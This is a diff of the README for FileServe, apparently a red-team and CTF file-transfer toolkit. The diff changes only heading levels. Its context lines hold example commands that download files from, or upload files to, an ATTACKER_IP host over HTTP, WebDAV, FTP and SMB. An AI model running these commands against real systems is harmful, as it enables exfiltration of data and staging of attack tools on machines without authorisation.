@@ -1,4 +1,4 @@
-# FileServe
+## FileServe
 
 **FileServe** is a lightweight **file transfer toolkit for red teamers, penetration testers, and CTF players**.
 
@@ -14,7 +14,7 @@ The goal is to provide **one command to quickly transfer files during engagement
 
 ---
 
-# Features
+## Features
 
 * Quick file hosting
 * Multiple transfer methods
@@ -26,7 +26,7 @@ The goal is to provide **one command to quickly transfer files during engagement
 
 ---
 
-# Supported Transfer Modes
+## Supported Transfer Modes
 
 | Mode         | Description                         |
 | ------------ | ----------------------------------- |
@@ -38,7 +38,7 @@ The goal is to provide **one command to quickly transfer files during engagement
 
 ---
 
-# Installation
+## Installation
 
 Clone the repository:
 
@@ -59,7 +59,7 @@ The script will automatically install required dependencies.
 
 ---
 
-# Usage
+## Usage
 
 ```
 FileServe - File Transfer Toolkit
@@ -90,9 +90,9 @@ FileServe [MODE] [OPTIONS]
 
 ---
 
-# Examples
+## Examples
 
-## Start HTTP Download Server
+### Start HTTP Download Server
 
 ```bash
 ./fileserve.sh -d 
@@ -106,7 +106,7 @@ wget http://ATTACKER_IP:8000/file.txt
 
 ---
 
-# SMB Share
+## SMB Share
 
 ```bash
 ./fileserve.sh --smb
@@ -126,7 +126,7 @@ net use D: \\ATTACKER_IP\share
 
 ---
 
-# WebDAV Upload Server
+## WebDAV Upload Server
 
 ```bash
 ./fileserve.sh --nginx
@@ -140,7 +140,7 @@ curl -T file.txt http://ATTACKER_IP:9001/upload/file.txt
 
 ---
 
-# Upload Server
+## Upload Server
 
 ```bash
 ./fileserve.sh --upload
@@ -154,7 +154,7 @@ curl -X POST http://ATTACKER_IP:8080/upload -F 'files=@file.txt'
 
 ---
 
-# FTP Server
+## FTP Server
 
 ```bash
 ./fileserve.sh --ftp
@@ -168,7 +168,7 @@ curl -T file.txt ftp://ATTACKER_IP:2121/
 
 ---
 
-# Authentication
+## Authentication
 
 You can enable authentication with:
 
@@ -178,7 +178,7 @@ You can enable authentication with:
 
 ---
 
-# Why FileServe?
+## Why FileServe?
 
 During CTFs and red team engagements you often need to:
 
@@ -191,7 +191,7 @@ FileServe provides **multiple transfer options in one toolkit**.
 
 ---
 
-# Dependencies
+## Dependencies
 
 Automatically installed if missing:
 
